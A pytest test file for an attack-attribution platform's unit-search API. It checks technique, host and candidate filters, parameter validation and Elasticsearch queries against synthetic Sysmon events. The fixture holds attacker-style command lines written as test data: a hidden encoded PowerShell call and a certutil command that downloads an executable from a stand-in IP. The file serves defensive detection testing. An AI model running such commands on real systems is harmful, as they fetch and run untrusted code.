"""ADR-0009 Amendment A: unit search. Exact AND-ed filters by investigation,
technique (incl. parent technique), host (case-insensitive), candidate; strict
parameter validation; truncation reported; results re-checked so they are exact
even on a backend that ignores the query (the in-memory test backend does)."""

from __future__ import annotations

import hashlib
import json
import threading
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from attribution_platform.api import create_server
from attribution_platform.attack_knowledge.loader import load_attack_knowledge
from attribution_platform.dataplane import FakeElasticClient
from attribution_platform.detection import DetectionEngine, load_rule_pack
from attribution_platform.investigation import run_investigation
from attribution_platform.replay.recording_pipeline import RecordingSource

REPO_ROOT = Path(__file__).resolve().parents[1]
SIGMA_PACK = (
    REPO_ROOT
    / "data"
    / "detection"
    / "sigma"
    / "r2026-07-01"
    / "generated"
    / "sigma-r2026-07-01-sigma_core++.rules.json"
)
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
WHOAMI = "C:\\Windows\\System32\\whoami.exe"
CERTUTIL = "C:\\Windows\\System32\\certutil.exe"


def _pc(
    record_id: int, second: int, host: str, guid: str, parent: str, image: str, cmd: str
) -> dict[str, Any]:
    return {
        "@timestamp": f"2026-01-01T12:00:{second:02d}.000Z",
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 1,
            "record_id": record_id,
            "computer_name": host,
            "event_data": {
                "UtcTime": f"2026-01-01 12:00:{second:02d}.000",
                "ProcessGuid": guid,
                "ProcessId": str(1000 + record_id),
                "Image": image,
                "CommandLine": cmd,
                "ParentProcessGuid": parent,
            },
        },
    }


@pytest.fixture(scope="module")
def service(tmp_path_factory: pytest.TempPathFactory) -> Iterator[tuple[str, str]]:
    records = [
        _pc(
            1, 1, "WS01.lab.local", "{P}", "{R}", PS, "powershell.exe -nop -w hidden -enc SQBFAFgA"
        ),
        _pc(2, 2, "WS01.lab.local", "{A}", "{P}", WHOAMI, "whoami /all -all"),
        _pc(
            3,
            5,
            "WS02.lab.local",
            "{C}",
            "{R2}",
            CERTUTIL,
            "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe",
        ),
        _pc(4, 6, "WS02.lab.local", "{D}", "{C}", WHOAMI, "whoami /all -all"),
    ]
    path = tmp_path_factory.mktemp("rec") / "two-hosts.zip"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("r.json", "\n".join(json.dumps(r) for r in records) + "\n")
    knowledge = load_attack_knowledge()
    pack = load_rule_pack(SIGMA_PACK, knowledge=knowledge)
    client = FakeElasticClient()
    record = run_investigation(
        RecordingSource(
            recording_id="two-hosts",
            path=path,
            sha256=hashlib.sha256(path.read_bytes()).hexdigest(),
            declared_sources={"WS01.lab.local": ("sysmon",), "WS02.lab.local": ("sysmon",)},
        ),
        client=client,
        engine=DetectionEngine(rules=pack.rules),
        knowledge=knowledge,
        detection_pack_content_hash=pack.content_hash,
    )
    server = create_server(client)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{server.server_address[1]}", record.investigation_id
    server.shutdown()
    server.server_close()


def _get(url: str) -> tuple[int, Any]:
    try:
        with urllib.request.urlopen(url, timeout=10) as response:  # noqa: S310 - local test server
            return response.status, json.loads(response.read())
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read())


def _hosts(body: dict[str, Any]) -> list[list[str]]:
    return [u["host_names"] for u in body["units"]]


def test_all_units_sorted_by_first_event(service: tuple[str, str]) -> None:
    status, body = _get(f"{service[0]}/units")
    assert status == 200 and body["truncated"] is False
    assert _hosts(body) == [["ws01.lab.local"], ["ws02.lab.local"]]


@pytest.mark.parametrize(
    ("query", "hosts"),
    [
        ("technique=T1059", [["ws01.lab.local"]]),  # parent technique finds T1059.001
        ("technique=T1059.001", [["ws01.lab.local"]]),
        ("technique=T1105", [["ws02.lab.local"]]),
        ("technique=T1033", [["ws01.lab.local"], ["ws02.lab.local"]]),
        ("host=WS02.LAB.LOCAL", [["ws02.lab.local"]]),  # host names are case-insensitive
        ("technique=T1033&host=ws01.lab.local", [["ws01.lab.local"]]),  # AND
        ("technique=T1105&host=ws01.lab.local", []),
        ("technique=T9999", []),
    ],
)
def test_filters(service: tuple[str, str], query: str, hosts: list[list[str]]) -> None:
    status, body = _get(f"{service[0]}/units?{query}")
    assert status == 200 and _hosts(body) == hosts


def test_candidate_filter_returns_only_units_with_that_candidate(service: tuple[str, str]) -> None:
    _, everything = _get(f"{service[0]}/units")
    candidate = everything["units"][1]["candidate_ids"][0]
    status, body = _get(f"{service[0]}/units?candidate={candidate}")
    assert status == 200 and body["units"]
    assert all(candidate in u["candidate_ids"] for u in body["units"])


def test_investigation_scoping(service: tuple[str, str]) -> None:
    base, investigation_id = service
    quoted = urllib.parse.quote(investigation_id, safe="")
    status, body = _get(f"{base}/investigations/{quoted}/units?technique=T1105")
    assert status == 200 and _hosts(body) == [["ws02.lab.local"]]
    assert body["filters"]["investigation"] == investigation_id
    assert _get(f"{base}/investigations/no-such-investigation/units")[0] == 404
    assert _get(f"{base}/investigations/{quoted}/units?investigation=x")[0] == 400
    status, body = _get(f"{base}/units?investigation=other")
    assert status == 200 and body["units"] == []


def test_limit_and_truncation(service: tuple[str, str]) -> None:
    status, body = _get(f"{service[0]}/units?limit=1")
    assert status == 200 and len(body["units"]) == 1 and body["truncated"] is True
    assert _hosts(body) == [["ws01.lab.local"]]  # the earliest unit, not an arbitrary one


@pytest.mark.parametrize(
    "query",
    [
        "/units?technique=1059",
        "/units?technique=",
        "/units?candidate=APT3",
        "/units?limit=0",
        "/units?limit=1001",
        "/units?limit=ten",
        "/units?colour=red",
        "/units?technique=T1059&technique=T1105",
        "/health?x=1",
        "/investigations?x=1",
        "/units/some-unit?x=1",
    ],
)
def test_invalid_parameters_are_refused(service: tuple[str, str], query: str) -> None:
    assert _get(f"{service[0]}{query}")[0] == 400


class _CapturingClient(FakeElasticClient):
    """Records the Query DSL a real Elasticsearch would receive."""

    def __init__(self) -> None:
        super().__init__()
        self.queries: list[Any] = []

    def search(self, index: str, query: Any, *, size: int, sort: Any = ()) -> tuple[Any, ...]:
        self.queries.append((index, query, size, tuple(sort)))
        return super().search(index, query, size=size, sort=sort)


def test_query_sent_to_elasticsearch_is_an_exact_term_filter() -> None:
    from attribution_platform.api.read_model import search_units
    from attribution_platform.investigation.records import UNIT_SUMMARIES_INDEX

    client = _CapturingClient()
    search_units(client, {"technique": "T1059", "host": "WS01.Lab.Local", "limit": "5"})
    index, query, size, sort = client.queries[-1]
    assert index == UNIT_SUMMARIES_INDEX and size == 5
    assert sort == ("first_seen", "group_id")  # the cap keeps the earliest units
    assert query == {
        "bool": {
            "filter": [
                {"term": {"host_names": "ws01.lab.local"}},
                {"term": {"technique_ids": "T1059"}},
            ]
        }
    }
    search_units(client, {})
    assert client.queries[-1][1] == {"match_all": {}}
